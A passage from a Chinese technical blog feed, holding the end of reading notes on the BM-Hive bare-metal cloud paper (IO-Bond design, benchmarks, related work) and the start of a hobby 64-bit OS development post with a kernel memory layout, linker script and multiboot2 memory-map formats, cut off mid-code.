class="headerlink" title="3.4 IO-Bond"></a>3.4 IO-Bond</h2><p>IO-Bond 用于充当计算卡上 virtio 设备的代理</p><p><strong>3.4.1 IO-Bond: Frontend.</strong>  IO-Bond 前端连接到计算板的 PCIe 总线，其 FPGA 模拟了 PCI 接口供 <code>bm-guest</code> 使用，并将 <code>bm-guest</code> 访问转发到后端</p><p><code>BM-Hive</code> 无法直接使用虚拟化系统的共享环缓冲区设计（IO-Bond 前后端物理内存不共享），因此由 IO-Bond 为 <code>bm-hypervisor</code> 与 <code>bm-guest</code> 提供环缓冲区，并将 <code>bm-hypervisor</code> 的环缓冲区与其他进行同步（如图 4 所示），在一个缓冲区被添加上数据后 IO-Bond 的 DMA 引擎便会拷贝到其他缓冲区</p><p><img src="https://s2.loli.net/2024/07/25/MNbjS7ifZ1ETYF3.png" alt="Figure 4. Shadow ring buffers in BM-Hive"></p><p><strong>3.4.2 IO-Bond: Backend.</strong> IO-Bond 后端将请求转发到对应云设备，其设计主要关注与云基础架构间的高性能 I&#x2F;O，在 <code>BM-Hive</code> 中所有 I&#x2F;O 请求通过 vhost-user 协议与云基础架构（修改版 DPDK vSwitch 和 SPDK 云存储，使用 poll mode driver 而非中断）交互，由此所有请求在用户空间完成处理，避免额外的内核与用户态间内存拷贝；此外 <code>BM-Hive</code> 支持 VGA 设备以连接 <code>bm-guest</code> 控制台</p><p><img src="https://s2.loli.net/2024/07/25/BR9A5OYKZgHCSUj.png" alt="Figure 5. Backend of BM-Hive"></p><p><strong>3.4.3 IO-Bond Implementation.</strong> 每个 virtio 设备的每个 virtio 队列都有一个对应的后端 shadow vring（IO-Bond 与 <code>bm-hypervisor</code> 间的共享缓冲区，所有 shadow vring 被组织为一个缓冲区描述符列表并映射到 IO-Bond 中）， <code>bm-hypervisor</code> 与 IO-Bond 间通过一对 mailbox 寄存器传递 PCI 访问提醒，且每个 shadow vring 都有一对 head&#x2F;tail 寄存器</p><p>图 6 展示了 IO-Bond 如何响应 guests 的一个传统的 virtio Tx&#x2F;Rx 工作流，<code>bm-guest</code> 写入 virtio 寄存器以通知 IO-Bond 、并在 Rx 数据到达时获得 MSI 中断；<code>bm-hypervisor</code> 中有一个专有线程拉取 IO mailbox 与 shadow vring head&#x2F;tail 寄存器以避免中断，图中 1 ～ 6 为标准 virtio 操作；最终 IO-Bond 通过更新 head 寄存器通知 <code>bm-hypervisor</code> ，收到的 Rx 缓冲区被保留</p><p><img src="https://s2.loli.net/2024/07/25/QYZm57sTAGkjb1x.png" alt="Figure 6. Tx/Rx example of IO-Bond"></p><p>得益于 IO-Bond 中 FPGA 的低开销，<code>bm-guest</code> 到 IO-Bond 的 PCI 读写操作仅需要 0.8 µs，IO-Bond 到 mailbox 寄存器又要 0.8 µs，单次访问总开销仅 1.6 µs；IO-Bond 为每个 virtio 网络&#x2F;存储设备暴露一个 PCIe x4 接口，通过 PCIe x8 接口备份到 <code>bm-hypervisor</code> ，IO-Bond 内部 DMA 吞吐量为 50Gbps（每个 x4 接口为 32 Gbps），通过服务器共享网络接口（100 Gbps） 转发到云服务，且 <code>bm-guest</code> 间贷款消耗会动态平衡以保持公平</p><h2 id="3-5-Costs-efficiency"><a href="#3-5-Costs-efficiency" class="headerlink" title="3.5 Costs efficiency"></a>3.5 Costs efficiency</h2><p>数据中心的盈利能力取决于 vCPU 密度，传统的基于 VM 的服务器需要为 hypervisor 与 host OS 保留 CPU 核心，而 <code>BM-Hive</code> 具有更高的 vCPU 成本效益（虽然需要额外的 CPU 与 FPGA 支出）</p><p>能耗也是成本效率的一个点，但 <code>BM-Hive</code> 与传统 VM 服务器提供的 vCPU 不同，因此很难比较</p><h1 id="0x04-Evaluation"><a href="#0x04-Evaluation" class="headerlink" title="0x04. Evaluation"></a>0x04. Evaluation</h1><h2 id="4-1-Environment-Setup"><a href="#4-1-Environment-Setup" class="headerlink" title="4.1 Environment Setup"></a>4.1 Environment Setup</h2><p>表 3 展示了作者部署 <code>BM-Hive</code> 的公有云上的实例配置，注意一个云实例的 I&#x2F;O 性能通常被限速以预防资源误用和提升整体服务质量</p><p><img src="https://s2.loli.net/2024/07/26/kXH73A6xrRhWcwI.png" alt="Table 3. Bare-metal instances available in our cloud. The last column shows the maximum number of the compute boards in a single BM-Hive server. This number depends on the server’s power supply, internal space, and I/O performance."></p><h2 id="4-2-CPU-and-Memory-Performance"><a href="#4-2-CPU-and-Memory-Performance" class="headerlink" title="4.2 CPU and Memory Performance"></a>4.2 CPU and Memory Performance</h2><p>所有实验在带有相同的基于 CentOS 的系统的 Xeon E5-2682 v4 实例上完成，作者对比了 <code>BM-Hive</code> 与 VM 以及物理机（可行时）的性能，<code>vm-guest</code> 与 <code>bm-guest</code> 都运行在 64G 内存的 Xeon E5-2682 v4 CPU 上，<code>vm-guest</code> 独占实例且固定到有 NMUA 节点亲和力的物理 CPU 核心上</p><p>作者将 <code>BM-Hive</code> 与 <code>vm-guest</code> 与物理机器的性能进行比较，内核版本为 <code>3.10.0-514.26.2.el7</code> ，但物理机有 2 个 CPU 插槽与 384G 内存，图 7 与 8 展示了 SPEC CINT 2006 与 STREAM 的多次测试结果</p><p><img src="https://s2.loli.net/2024/07/26/zp1CjeF8Tn2BvNK.png" alt="Figure 7. CPU performance by SPEC CPU2006 Figure 8. Memory bandwidth by STREAM multi-thread"></p><p>CPU 的测试结果相近，<code>BM-Hive</code> 比物理机快 4%，VM 比物理机慢 4% ，注意到 <code>bm-guest</code> 与物理机性能并不完全相同（因为配置与设计不同）， <code>vm-guest</code> 则因为虚拟化的缘故存在开销</p><p><code>BM-HIve</code> 在内存上同样占优，如图 8 所示<code>BM-HIve</code> 几乎与物理机完全相同，但 <code>vm-guest</code> 由于虚拟化开销最多只有 <code>bm-guest</code> 98% 的性能</p><p><strong>Summary</strong> ：同配置 <code>bm-guest</code>比  <code>vm-guest</code> 有更好的 CPU 与内存性能，且 <code>BM-HIve</code> 可以利用单线程性能更高的 CPU</p><h2 id="4-3-I-O-Performance"><a href="#4-3-I-O-Performance" class="headerlink" title="4.3 I&#x2F;O Performance"></a>4.3 I&#x2F;O Performance</h2><p><code>bm-guest</code> 与 <code>vm-guest</code> 有着近乎一样的基于 virtio 的 IO 路径，但 <code>BM-Hive</code> 有着软硬件结合的设计，本节我们对比同一云网络与存储下的性能，guests 网速被限制在 4M PPS 与 10Gbps 的带宽，存储被限制在 25 IOPS 与 300 MBps 的带宽</p><p><strong>Network performance</strong> ：作者使用 <code>netperf-2.5</code> 在两个 <code>bm-guest</code> 间收发 UDP 包（并添加 <code>vm-guest</code> 对照组），结果如图 9 所示， <code>bm-guest</code> 与 <code>vm-guest</code> 都达到了 3.2M PPS，由于 <code>BM-Hive</code> 的 I&#x2F;O 路径更长所以 <code>vm-guest</code> 有着更少的抖动</p><p><img src="https://s2.loli.net/2024/07/26/J9iERPS8zLXpCdU.png" alt="Figure 9. UDP packet receive rate"></p><p>作者使用不同的工具对比了 <code>bm-guest</code> 与 <code>vm-guest</code> 的延迟以测算 IO-Bond 开销，图 10 显示了使用 <code>sockperf-3.5</code> 测试 UDP 的结果（并使用 DPDK 绕过内核），由于 <code>BM-Hive</code> 的 I&#x2F;O 路径更长所以 <code>vm-guest</code> 结果更好（在 ICMP 上也是）</p><p><img src="https://s2.loli.net/2024/07/26/7TVJfov5DQeHd8n.png" alt="Figure 10. UDP and ping latency"></p><p>吞吐量也是网络性能的重点，作者使用 <code>netperf-2.5</code> 测试 64  个单个数据包为 1400B 的 TCP 连接，<code>bm-guest</code> 为 9.6 Gbps， <code>vm-guest</code> 为 9.59 Gbps</p><p>总之，<code>BM-Hive</code> 性能满足设计目的，此外作者通过取消 PPS 限制来测量其最大网络性能（可以达到 16M PPS）</p><p><strong>Storage performance</strong> ：作者通过100Gbps 网络访问 SSD 云存储运行 fio benchmark 使用 8 线程进行 4KB 随机读写， <code>bm-guest</code> 与 <code>vm-guest</code> 都是饱和存储速率，但如图 11 所示 <code>bm-guest</code> 有更低的平均延迟与 99.9% 延迟</p><p><img src="https://s2.loli.net/2024/07/26/BKcsrvJhi26TnO8.png" alt="Figure 11. Storage I/O latency"></p><p>作者还测试了无限制的访问本地 SSD 的存储性能， <code>BM-Hive</code> 在 IOPS 上比 VM 快 50%，在带宽上快 100%，平均延迟仅为 60µs</p><p>总之，<code>BM-Hive</code> 的存储性能得益于 IO-Bond 的 DMA 引擎而比需要额外内存拷贝的 VM 更好</p><p><strong>Summary</strong> ：<code>bm-guest</code> 与 <code>vm-guest</code> 都能达到基于云的网络与存储 IO 限制，但 <code>bm-guest</code> 在更坏情况（99.9 percentile）下更好，在无限制下比 <code>vm-guest</code> 性能显著提高</p><h2 id="4-4-Application-Performance"><a href="#4-4-Application-Performance" class="headerlink" title="4.4 Application Performance"></a>4.4 Application Performance</h2><p>一个重要的实验是 <code>BM-Hive</code> 执行云上常用应用的性能，测试结果如图 12、13、14 所示</p><blockquote><p>详细的实验数据就不抄了，自己去看原文（笑）</p></blockquote><p><img src="https://s2.loli.net/2024/07/26/T4Pt6phkYzZOb2x.png" alt="Figure 12. NGINX Figure 13. MariaDB ready-only Figure 14. MariaDB rd/wr and wr-only Figure 15. Redis with varying clients Figure 16. Redis with varying data size"></p><p><strong>Summary</strong> ： <code>BM-Hive</code> 运行流行云上应用的性能比基于虚拟化的云服务更好</p><h1 id="0x05-Related-Work"><a href="#0x05-Related-Work" class="headerlink" title="0x05. Related Work"></a>0x05. Related Work</h1><p><strong>Reducing world switches</strong> ：虚拟化的主要开销之一便是 guest 与 hypervisor 间的切换，有一部分工作便关注于减少切换，例如形如网卡的高速驱动会产生大量中断，<a href="https://dl.acm.org/doi/pdf/10.1145/2248487.2151020">ELI</a> （Exit-Less Interrupt）致力于将 hypervisor 从中断路径上移除从而让 Guest 直接处理中断以提高吞吐量并减少延迟；此外在 guest 侧也有优化空间，如 KVM 最近引入的 <code>halt_polling</code> 特性在让 CPU 休眠前拉取唤醒请求以避免 guest 在休眠后又立即被等待中的唤醒请求唤醒；但 <code>BM-Hive</code> 不会有这些问题</p><p><strong>Memory virtualization</strong> ：内存通常被虚拟化为两级页表：GVA➡️GPA➡️HPA，因此现有工作之一便是减少开销极大的 TLB miss ，如增大 TLB 覆盖率（例如使用大页）或减少 TLB 惩罚，如 <a href="https://dl.acm.org/doi/10.1145/3140659.3080210">POM-TLB</a> 便是将内存的一部分作为 TLB 以增大 TLB，或是<a href="https://www.usenix.org/conference/atc17/technical-sessions/presentation/amit">跟踪页访问以维护 TLB 而减少 TLB miss</a>；但 <code>BM-Hive</code> 不会有这些问题</p><p><strong>Device virtualization</strong> ：现有虚拟设备大都通过半虚拟化实现，最流行的便是 virtio ，此外如 SR-IOV 网卡等也支持原生虚拟化；特别地，<code>BM-Hive</code> 通过混合方式实现了 virtio 以与现有云基础架构交互</p><p><strong>Minimal hypervisor</strong> ：也有一些工作关注于创建最小的 hypervisor ，如 Intel 的 ACRN 便是用于嵌入式 IOT 设备的小型 hypervisor （ <del>笔者注：嵌入式设备还要跑 VM？</del> ）；<code>BM-Hive</code> 比传统的 hypervisor 都简单，因为其并不虚拟化任何东西，也不直接与 <code>bm-guest</code> 交互</p><p><strong>Nest hypervisor</strong> ：<code>BM-Hive</code> 目标之一便是让用户能运行自己的虚拟机，在传统架构上嵌套虚拟化可以实现但开销较大，<code>BM-Hive</code> 的用户直接运行在物理 CPU 上因而有着完全的硬件虚拟化支持</p><p><strong>Other bare-metal services</strong> ：绝大部分公有云都部署了单租户裸金属服务，限制如第 1 节所示；部分公有云也为 VM 部署了特殊的网络设备，例如 Azure 也有智能网卡，但据作者所知其更关注底层云基础架构的优化，而 <code>BM-Hive</code> 并不接触云基础架构层</p><p>也有部分系统有着相似的整体架构，如 Intel 的 VCA2 便是一个带有三个 Xeon E3 v1258L 处理器的 PCIe 卡，但 <code>BM-Hive</code>  是为了云服务而生的</p><h1 id="0x06-Discussion"><a href="#0x06-Discussion" class="headerlink" title="0x06. Discussion"></a>0x06. Discussion</h1><p>本节讨论 <code>BM-Hive</code> 的潜在提升与未来研究计划</p><p><strong>Improvements to IO-Bond</strong> ： IO-Bond 的设计可以进行优化（例如将包处理从 <code>bm-hypervisor</code> 卸载到 IO-Bond 上），除了使用 FPGA 以外也可以使用 ASIC 实现</p><p><strong>Live Migration and Upgrade</strong> ：虚拟机动态迁移非常重要，<a href="https://dl.acm.org/doi/10.1145/3297858.3304034">Orthus</a> 被用于在不停止虚拟机的情况下动态升级 VMM，<code>BM-Hive</code> 的设计使其可以直接应用 Orthus 的方案升级 VMM，但 <code>bm-guest</code> 的迁移则更有挑战，目前的方案是插入一个虚拟化曾并将其转换为 <code>vm-guest</code> ，但仍存在优化空间</p><p><strong>SGX Support</strong> ：SGX 是一个可信执行环境，但目前的虚拟机不好使用这个东西，作者计划在未来为 <code>BM-Hive</code> 添加原生 SGX 支持</p><h1 id="0x07-Summary"><a href="#0x07-Summary" class="headerlink" title="0x07. Summary"></a>0x07. Summary</h1><p>作者设计了 <code>BM-Hive</code> 并进行了评估，很好很强大🎇🎆🎇</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;出走字节 IaaS 开发实习两年，归来读安全 PhD 依然在做 DPU&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="系统虚拟化" scheme="https://arttnba3.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="云计算" scheme="https://arttnba3.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    <category term="DPU" scheme="https://arttnba3.github.io/tags/DPU/"/>
    
    <category term="裸金属" scheme="https://arttnba3.github.io/tags/%E8%A3%B8%E9%87%91%E5%B1%9E/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x04】现代 64 位 OS 开发手记 II：内核内存分配器与 C++ 的初步引入</title>
    <link href="https://arttnba3.github.io/2024/06/30/CODE-0X04-OSDEV64-II_MEMORY-MANAGE/"/>
    <id>https://arttnba3.github.io/2024/06/30/CODE-0X04-OSDEV64-II_MEMORY-MANAGE/</id>
    <published>2024-06-30T13:39:41.000Z</published>
    <updated>2024-10-11T02:54:24.669Z</updated>
    
    <content type="html"><![CDATA[<p>Good old MEMORIES has gone…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>不知不觉这个系列的文章居然已经鸽了大半年了…虽然说已经拖了这么久没有继续进行下一步的代码编写，不过笔者目前暂时并没有放弃这个项目，只是确实不像本科那样能有大段大段的空闲时间去抛开一切去做自己想做的事情了：）</p><p>言归正传，这一次我们将要脱离引导阶段，进入到位于高地址的真正的内核，并建立内存管理系统，笔者选择优先实现内存管理的原因是因为这是一个非常核心的模块，操作系统内核的各个部分几乎都无时无刻不在进行动态内存分配与释放，因此完成了这个模块的开发之后我们后续的工作也能变得更加方便</p><p>本项目代码开源在 <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><blockquote><p>注： <strong>本章暂时省略了常规的内核输出语句</strong> （如类似 <code>printk()</code> 的东西），我们将在下一章完成图形与串口驱动初始化后再重新引入这部分功能，如若你需要查看调试信息，则可以 <em>临时重新引入</em> boot 阶段的输出模块</p></blockquote><blockquote><p>注2：本章额外引入了部分辅助用的基础内核数据结构（例如双向链表），由于其实现简单且并非讲述重点，因此本文 <strong>不会详细叙述所有额外添加了的东西</strong> ，而是仅关注于 <code>内存分配</code> 这一主线，对于此类基础数据结构的实现方式感兴趣的同学可以自行查看源码：）</p></blockquote><h2 id="内核内存布局设定与链接脚本调整"><a href="#内核内存布局设定与链接脚本调整" class="headerlink" title="内核内存布局设定与链接脚本调整"></a>内核内存布局设定与链接脚本调整</h2><p>目前我们暂定的内核内存布局如下所示，笔者在设计时尽量使各个区域都对齐到一个四级页表条目 （512 GB），从而使得我们在后续创建进程时无需重复拷贝过多的内核页表项，而可以尽量进行复用：</p><table><thead><tr><th align="center">Start address</th><th align="center">End address</th><th align="center">Size</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">0x0000000000000000</td><td align="center">0x00007FFFFFFFFFFF</td><td align="center">128TB</td><td align="center">memory space for user-mode process, isolate for per one</td></tr><tr><td align="center">0x0000800000000000</td><td align="center">0xFFFF7FFFFFFFFFFF</td><td align="center">16776960 TB</td><td align="center">unused hole</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">shared kernel-space virtual memory for all processes</td></tr><tr><td align="center">0xFFFF800000000000</td><td align="center">0xFFFFBFFFFFFFFFFF</td><td align="center">64TB</td><td align="center">direct mapping of first 64TB physical memory (physmem_base)</td></tr><tr><td align="center">0xFFFFC00000000000</td><td align="center">0xFFFFCFFFFFFFFFFF</td><td align="center">16TB</td><td align="center">dynamic kernel memory mapping region (vmremap_base)</td></tr><tr><td align="center">0xFFFFD00000000000</td><td align="center">0xFFFFEFFFFFFFFFFF</td><td align="center">32TB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFF00000000000</td><td align="center">0xFFFFF7FFFFFFFFFF</td><td align="center">8TB</td><td align="center">page database (pgdb_base)</td></tr><tr><td align="center">0xFFFFF80000000000</td><td align="center">0xFFFFF9FFFFFFFFFF</td><td align="center">2TB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFFA0000000000</td><td align="center">0xFFFFFA0FFFFFFFFF</td><td align="center">64GB</td><td align="center">kernel stack, isolate for each process</td></tr><tr><td align="center">0xFFFFFA1000000000</td><td align="center">0xFFFFFF7FFFFFFFFF</td><td align="center">5568GB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFFF8000000000</td><td align="center">0xFFFFFF800FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .text segment</td></tr><tr><td align="center">0xFFFFFF8010000000</td><td align="center">0xFFFFFF801FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .data segment</td></tr><tr><td align="center">0xFFFFFF8020000000</td><td align="center">0xFFFFFF802FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .rodata segment</td></tr><tr><td align="center">0xFFFFFF8030000000</td><td align="center">0xFFFFFF803FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .bss segment</td></tr><tr><td align="center">0xFFFFFF8050000000</td><td align="center">0xFFFFFFFFFFFFFFFF</td><td align="center">511GB</td><td align="center">unused hole</td></tr></tbody></table><p>相应地，我们需要略微调整一下原有的链接脚本中的内核部分，在第一章时笔者仅是简单地将其放置在高内存区域，现在我们根据如上所示内存布局进行调整，这里注意计算各个段的物理位置：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs stata">OUTPUT_FORMAT(<span class="hljs-string">&quot;elf64-x86-64&quot;</span>)<br>OUTPUT_ARCH(i386:x86-64)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br>    <span class="hljs-comment">/* boot loader will load the kernel there */</span><br>    . = 1M;<br>__boot_start = .;<br><br><span class="hljs-comment">/* ASM boot-state kernel */</span><br><br>    .<span class="hljs-keyword">boot</span>.loader :<br>&#123;<br><span class="hljs-keyword">KEEP</span>(*(.<span class="hljs-keyword">boot</span>.header))<br><span class="hljs-comment">*(.boot.*)</span><br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a<br>&#125;<br><br>. = ALIGN(4096);<br><br><span class="hljs-comment">/* C boot-state kernel */</span><br><br>.<span class="hljs-keyword">boot</span>.text ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.<span class="hljs-keyword">boot</span>.rodata ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.<span class="hljs-keyword">boot</span>.data ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.data)<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.*)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__boot_end = .;<br><br><span class="hljs-comment">/* now we come to the REAL kernel */</span><br><br>KERN_ELF_BASE = 0xFFFFFF8000000000;<br>. = KERN_ELF_BASE;<br>__kernel_start = .;<br><br><span class="hljs-comment">/* we use AT() there to make it loaded on phys correctly */</span><br><br>KERN_TEXT_BASE = KERN_ELF_BASE;<br>. = KERN_TEXT_BASE;<br>__kernel_text_base = .;<br><br>.text ALIGN(4096) : AT (__kernel_text_base - __kernel_start + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.text)</span><br><span class="hljs-comment">*(.text.*)</span><br><span class="hljs-comment">*(.ltext)</span><br><span class="hljs-comment">*(.ltext.*)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_text_end = .;<br>__kernel_text_sz = __kernel_text_end - __kernel_text_base;<br><br>KERN_DATA_BASE = 0xFFFFFF8010000000;<br>. = KERN_DATA_BASE;<br>__kernel_data_base = .;<br><br>.data ALIGN(4096) : AT (__kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.data)</span><br><span class="hljs-comment">*(.ldata)</span><br><br><span class="hljs-comment">/* we have to set these arraies aligned to 8 bytes */</span><br>. = ALIGN(8);<br><br>__init_array = .;<br><span class="hljs-comment">*(.init_array)</span><br>__init_array_end = .;<br>__fini_array = .;<br><span class="hljs-comment">*(.fini_array)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_data_end = .;<br>__kernel_data_sz = __kernel_data_end - __kernel_data_base;<br><br>KERN_RODATA_BASE = 0xFFFFFF8020000000;<br>. = KERN_RODATA_BASE;<br>__kernel_rodata_base = .;<br><br>.rodata ALIGN(4096) : AT (__kernel_data_sz + __kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.rodata)</span><br><span class="hljs-comment">*(.rodata.*)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_rodata_end = .;<br>__kernel_rodata_sz = __kernel_rodata_end - __kernel_rodata_base;<br><br>KERN_BSS_BASE = 0xFFFFFF8030000000;<br>. = KERN_BSS_BASE;<br>__kernel_bss_base = .;<br><br>.bss ALIGN(4096) : AT (__kernel_rodata_sz + __kernel_data_sz + __kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(COMMON)</span><br><span class="hljs-comment">*(.bss)</span><br><span class="hljs-comment">*(.lbss)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_bss_end = .;<br>__kernel_bss_sz = __kernel_bss_end - __kernel_bss_base;<br><br>. = ALIGN(4096);<br><br>__kernel_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x01-内存探测，临时内存分配器，页表重建"><a href="#0x01-内存探测，临时内存分配器，页表重建" class="headerlink" title="0x01. 内存探测，临时内存分配器，页表重建"></a>0x01. 内存探测，临时内存分配器，页表重建</h1><h2 id="内存容量获取与线性内存分配器"><a href="#内存容量获取与线性内存分配器" class="headerlink" title="内存容量获取与线性内存分配器"></a>内存容量获取与线性内存分配器</h2><p>在初始化内存管理器之前，首先我们需要知道当前究竟有多少内存，熟悉 BIOS 下 OS 开发的同学肯定对BIOS <code>0x15</code> 中断的 <code>0xE820</code> 、<code>0xE801</code> 、<code>0x88</code> 这三板斧再熟悉不过了，然而在 UEFI 启动中我们是无法使用 legacy BIOS 的中断进行内存探测的</p><p>万幸的是在 UEFI 中同样有类似的接口供我们获取内存容量——<a href="https://uefi.org/htmlspecs/ACPI_Spec_6_4_html/15_System_Address_Map_Interfaces/uefi-getmemorymap-boot-services-function.html">UEFI GetMemoryMap()</a>，不过在我们的系统当中，通过该接口获取内存容量的任务是由 EFI 程序 Grub 完成的—— <strong>得益于 multiboot2 规范的存在，我们可以直接从 multiboot2 header 中获取到内存容量</strong> </p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">multiboot2 规范</a>中 Memory Map 段的 tag 格式如下，其中 <code>size</code> 为 tag header 加上 所有 entry 的大小， <code>entry_size</code> 为单条 entry 的大小：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u32     |<span class="hljs-string"> type = 6          </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>u32     |<span class="hljs-string"> entry_size        </span>|<br>u32     |<span class="hljs-string"> entry_version     </span>|<br>varies  |<span class="hljs-string"> entries           </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>每个 entry 的格式如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u64     |<span class="hljs-string"> base_addr         </span>|<br>u64     |<span class="hljs-string"> length            </span>|<br>u32     |<span class="hljs-string"> type              </span>|<br>u32     |<span class="hljs-string"> reserved          </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>我们简单写一个示例函数（非正式代码）进行测试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">boot_mm_test</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span></span><br><span 